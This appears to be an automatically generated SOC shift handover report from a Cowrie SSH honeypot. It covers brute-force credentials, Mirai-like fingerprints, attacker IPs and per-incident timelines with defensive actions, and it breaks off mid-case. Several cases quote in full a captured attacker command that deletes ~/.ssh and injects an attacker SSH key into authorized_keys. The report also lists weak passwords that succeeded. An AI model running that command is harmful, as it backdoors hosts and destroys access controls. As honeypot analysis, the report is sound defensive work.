# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-22 |
| **Generated At** | 2026-05-22T10:55:26Z |
| **Shift Time** | 10:55 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **213** |
| Confirmed Threats | **127** |
| False Positives Filtered | **86** (40.4%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **19** |
| High Severity Cases | **32** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **181** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **63** |
| Unique Credential Pairs | **41** |
| Unique Usernames | **11** |
| Unique Passwords | **37** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `345gs5662d34` | 9 |
| `admin` | 4 |
| `GET / HTTP/1.1` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 9 |
| `Host: 13.235.92.17:23` | 3 |
| `Accept-Encoding: gzip` | 3 |
| `$4` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 9 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 3 |
| `*1` | `$4` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa12345678.` | `14.63.196.175` | 2026-05-22T07:53:56 |
| `root` | `3245gs5662d34` | `14.63.196.175` | 2026-05-22T07:54:00 |
| `root` | `zy@123456` | `154.12.28.97` | 2026-05-22T07:56:48 |
| `root` | `3245gs5662d34` | `154.12.28.97` | 2026-05-22T07:56:51 |
| `root` | `admin` | `178.205.15.179` | 2026-05-22T08:17:26 |
| `root` | `12345` | `178.205.15.179` | 2026-05-22T08:17:43 |
| `root` | `guest` | `178.205.15.179` | 2026-05-22T08:17:59 |
| `root` | `123` | `178.205.15.179` | 2026-05-22T08:18:47 |
| `root` | `hlL0mlNAabiR` | `178.205.15.179` | 2026-05-22T08:19:03 |
| `root` | `test` | `178.205.15.179` | 2026-05-22T08:19:19 |
| `root` | `toor` | `178.205.15.179` | 2026-05-22T08:19:35 |
| `root` | `qwerty` | `178.205.15.179` | 2026-05-22T08:19:51 |
| `root` | `pfsense` | `178.205.15.179` | 2026-05-22T08:20:06 |
| `root` | `ubuntu` | `178.205.15.179` | 2026-05-22T08:20:22 |
| `root` | `2glehe5t24th1issZs` | `178.205.15.179` | 2026-05-22T08:20:38 |
| `root` | `5nWt3P-fF4WosQm5O` | `178.205.15.179` | 2026-05-22T08:20:54 |
| `root` | `FAqY7=MZk66k-ob3Rmk` | `178.205.15.179` | 2026-05-22T08:21:10 |
| `root` | `123456a.` | `197.243.14.52` | 2026-05-22T08:26:01 |
| `root` | `3245gs5662d34` | `197.243.14.52` | 2026-05-22T08:26:07 |
| `root` | `admin@1234567890` | `45.143.200.246` | 2026-05-22T08:27:35 |
| `root` | `3245gs5662d34` | `45.143.200.246` | 2026-05-22T08:27:39 |
| `root` | `Ss123456789` | `197.44.15.210` | 2026-05-22T08:33:57 |
| `root` | `3245gs5662d34` | `197.44.15.210` | 2026-05-22T08:34:00 |
| `root` | `` | `176.65.139.161` | 2026-05-22T08:55:36 |
| `root` | `555666` | `103.97.135.244` | 2026-05-22T10:26:33 |
| `root` | `3245gs5662d34` | `103.97.135.244` | 2026-05-22T10:26:37 |
| `root` | `123456+` | `101.36.108.213` | 2026-05-22T10:35:45 |
| `root` | `3245gs5662d34` | `101.36.108.213` | 2026-05-22T10:35:48 |
| `root` | `1qaz2wsx!QAZ@WSX` | `101.36.108.213` | 2026-05-22T10:43:51 |
| `root` | `root.2026` | `101.36.108.213` | 2026-05-22T10:47:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **213** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 58 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f45fb203c310...` | Mirai/variant | 26 | 1 |
| `f555226df196...` | Mirai/variant | 25 | 6 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f45fb203c310...` | libssh | 26 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 25 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `176.65.139.161`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `154.12.28.97`, `197.243.14.52`, `45.143.200.246`, `103.97.135.244`, `14.63.196.175`, `101.36.108.213`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **26** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | MEDIUM |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS37611` | AFRIHOST SP (PTY) LTD | 1 | MEDIUM |
| `AS7497` | Computer Network Information Center of Chinese Academy of Sciences (CNIC-CAS) | 1 | HIGH |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS8151` | UNINET | 1 | LOW |
| `AS28840` | PJSC TATTELECOM | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (32)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9c43c2656833

| Field | Detail |
|---|---|
| **Source IP** | `14.63.196[.]175` |
| **First Seen** | 2026-05-22 07:53 |
| **Last Seen** | 2026-05-22 07:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 07:53:55` | `cowrie.session.connect` |
| `2026-05-22 07:53:55` | `cowrie.client.version` |
| `2026-05-22 07:53:55` | `cowrie.client.kex` |
| `2026-05-22 07:53:56` | `cowrie.login.success` |
| `2026-05-22 07:53:56` | `cowrie.session.params` |
| `2026-05-22 07:53:56` | `cowrie.command.input` |
| `2026-05-22 07:53:56` | `cowrie.command.failed` |
| `2026-05-22 07:53:56` | `cowrie.log.closed` |
| `2026-05-22 07:53:57` | `cowrie.session.params` |
| `2026-05-22 07:53:57` | `cowrie.command.input` |
| `2026-05-22 07:53:57` | `cowrie.session.file_download` |
| `2026-05-22 07:53:57` | `cowrie.log.closed` |
| `2026-05-22 07:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.196[.]175` to AbuseIPDB if not already reported
- [ ] Block `14.63.196[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae157e90c6c5

| Field | Detail |
|---|---|
| **Source IP** | `14.63.196[.]175` |
| **First Seen** | 2026-05-22 07:53 |
| **Last Seen** | 2026-05-22 07:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 07:53:59` | `cowrie.session.connect` |
| `2026-05-22 07:53:59` | `cowrie.client.version` |
| `2026-05-22 07:53:59` | `cowrie.client.kex` |
| `2026-05-22 07:54:00` | `cowrie.login.success` |
| `2026-05-22 07:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.196[.]175` to AbuseIPDB if not already reported
- [ ] Block `14.63.196[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f30d259febf

| Field | Detail |
|---|---|
| **Source IP** | `154.12.28[.]97` |
| **First Seen** | 2026-05-22 07:56 |
| **Last Seen** | 2026-05-22 07:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 07:56:48` | `cowrie.session.connect` |
| `2026-05-22 07:56:48` | `cowrie.client.version` |
| `2026-05-22 07:56:48` | `cowrie.client.kex` |
| `2026-05-22 07:56:48` | `cowrie.login.success` |
| `2026-05-22 07:56:49` | `cowrie.session.params` |
| `2026-05-22 07:56:49` | `cowrie.command.input` |
| `2026-05-22 07:56:49` | `cowrie.command.failed` |
| `2026-05-22 07:56:49` | `cowrie.log.closed` |
| `2026-05-22 07:56:49` | `cowrie.session.params` |
| `2026-05-22 07:56:49` | `cowrie.command.input` |
| `2026-05-22 07:56:49` | `cowrie.session.file_download` |
| `2026-05-22 07:56:49` | `cowrie.log.closed` |
| `2026-05-22 07:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.12.28[.]97` to AbuseIPDB if not already reported
- [ ] Block `154.12.28[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86749b54737c

| Field | Detail |
|---|---|
| **Source IP** | `154.12.28[.]97` |
| **First Seen** | 2026-05-22 07:56 |
| **Last Seen** | 2026-05-22 07:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 07:56:51` | `cowrie.session.connect` |
| `2026-05-22 07:56:51` | `cowrie.client.version` |
| `2026-05-22 07:56:51` | `cowrie.client.kex` |
| `2026-05-22 07:56:51` | `cowrie.login.success` |
| `2026-05-22 07:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.12.28[.]97` to AbuseIPDB if not already reported
- [ ] Block `154.12.28[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6148c7a89df3

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:17 |
| **Last Seen** | 2026-05-22 08:22 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:17:22` | `cowrie.session.connect` |
| `2026-05-22 08:17:22` | `cowrie.client.version` |
| `2026-05-22 08:17:23` | `cowrie.client.kex` |
| `2026-05-22 08:17:26` | `cowrie.login.success` |
| `2026-05-22 08:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23704662c206

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:17 |
| **Last Seen** | 2026-05-22 08:22 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:17:37` | `cowrie.session.connect` |
| `2026-05-22 08:17:37` | `cowrie.client.version` |
| `2026-05-22 08:17:39` | `cowrie.client.kex` |
| `2026-05-22 08:17:43` | `cowrie.login.success` |
| `2026-05-22 08:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ae70a115d2

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:17 |
| **Last Seen** | 2026-05-22 08:22 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:17:53` | `cowrie.session.connect` |
| `2026-05-22 08:17:53` | `cowrie.client.version` |
| `2026-05-22 08:17:55` | `cowrie.client.kex` |
| `2026-05-22 08:17:59` | `cowrie.login.success` |
| `2026-05-22 08:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-843f19e12a45

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:18 |
| **Last Seen** | 2026-05-22 08:23 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:18:41` | `cowrie.session.connect` |
| `2026-05-22 08:18:41` | `cowrie.client.version` |
| `2026-05-22 08:18:43` | `cowrie.client.kex` |
| `2026-05-22 08:18:47` | `cowrie.login.success` |
| `2026-05-22 08:23:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01577b2f2ba4

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:18 |
| **Last Seen** | 2026-05-22 08:24 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:18:58` | `cowrie.session.connect` |
| `2026-05-22 08:18:58` | `cowrie.client.version` |
| `2026-05-22 08:18:59` | `cowrie.client.kex` |
| `2026-05-22 08:19:03` | `cowrie.login.success` |
| `2026-05-22 08:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-944dc734ef04

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:19 |
| **Last Seen** | 2026-05-22 08:24 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:19:14` | `cowrie.session.connect` |
| `2026-05-22 08:19:14` | `cowrie.client.version` |
| `2026-05-22 08:19:16` | `cowrie.client.kex` |
| `2026-05-22 08:19:19` | `cowrie.login.success` |
| `2026-05-22 08:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cd3708ae802

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:19 |
| **Last Seen** | 2026-05-22 08:24 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:19:30` | `cowrie.session.connect` |
| `2026-05-22 08:19:30` | `cowrie.client.version` |
| `2026-05-22 08:19:31` | `cowrie.client.kex` |
| `2026-05-22 08:19:35` | `cowrie.login.success` |
| `2026-05-22 08:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1034b01bb3c1

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:19 |
| **Last Seen** | 2026-05-22 08:24 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:19:46` | `cowrie.session.connect` |
| `2026-05-22 08:19:46` | `cowrie.client.version` |
| `2026-05-22 08:19:48` | `cowrie.client.kex` |
| `2026-05-22 08:19:51` | `cowrie.login.success` |
| `2026-05-22 08:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c51de4543a

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:20 |
| **Last Seen** | 2026-05-22 08:25 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:20:02` | `cowrie.session.connect` |
| `2026-05-22 08:20:02` | `cowrie.client.version` |
| `2026-05-22 08:20:03` | `cowrie.client.kex` |
| `2026-05-22 08:20:06` | `cowrie.login.success` |
| `2026-05-22 08:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d5ed0fe24a

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:20 |
| **Last Seen** | 2026-05-22 08:25 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:20:17` | `cowrie.session.connect` |
| `2026-05-22 08:20:17` | `cowrie.client.version` |
| `2026-05-22 08:20:19` | `cowrie.client.kex` |
| `2026-05-22 08:20:22` | `cowrie.login.success` |
| `2026-05-22 08:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76f368e6f61

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:20 |
| **Last Seen** | 2026-05-22 08:25 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:20:33` | `cowrie.session.connect` |
| `2026-05-22 08:20:33` | `cowrie.client.version` |
| `2026-05-22 08:20:35` | `cowrie.client.kex` |
| `2026-05-22 08:20:38` | `cowrie.login.success` |
| `2026-05-22 08:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0059492cc88c

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:20 |
| **Last Seen** | 2026-05-22 08:25 |
| **Session Duration** | 305s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:20:49` | `cowrie.session.connect` |
| `2026-05-22 08:20:49` | `cowrie.client.version` |
| `2026-05-22 08:20:51` | `cowrie.client.kex` |
| `2026-05-22 08:20:54` | `cowrie.login.success` |
| `2026-05-22 08:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d676285c20

| Field | Detail |
|---|---|
| **Source IP** | `178.205.15[.]179` |
| **First Seen** | 2026-05-22 08:21 |
| **Last Seen** | 2026-05-22 08:26 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:21:05` | `cowrie.session.connect` |
| `2026-05-22 08:21:05` | `cowrie.client.version` |
| `2026-05-22 08:21:06` | `cowrie.client.kex` |
| `2026-05-22 08:21:10` | `cowrie.login.success` |
| `2026-05-22 08:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.205.15[.]179` to AbuseIPDB if not already reported
- [ ] Block `178.205.15[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16bc63c3fe5a

| Field | Detail |
|---|---|
| **Source IP** | `197.243.14[.]52` |
| **First Seen** | 2026-05-22 08:26 |
| **Last Seen** | 2026-05-22 08:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 08:26:00` | `cowrie.session.connect` |
| `2026-05-22 08:26:00` | `cowrie.client.version` |
| `2026-05-22 08:26:00` | `cowrie.client.kex` |
| `2026-05-22 08:26:01` | `cowrie.login.success` |
| `2026-05-22 08:26:02` | `cowrie.session.params` |
| `2026-05-22 08:26:02` | `cowrie.command.input` |
| `2026-05-22 08:26:02` | `cowrie.command.failed` |
| `2026-05-22 08:26:02` | `cowrie.log.closed` |
| `2026-05-22 08:26:03` | `cowrie.session.params` |
| `2026-05-22 08:26:03` | `cowrie.command.input` |
| `2026-05-22 08:26:03` | `cowrie.session.file_download` |
| `2026-05-22 08:26:03` | `cowrie.log.closed` |
| `2026-05-22 08:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
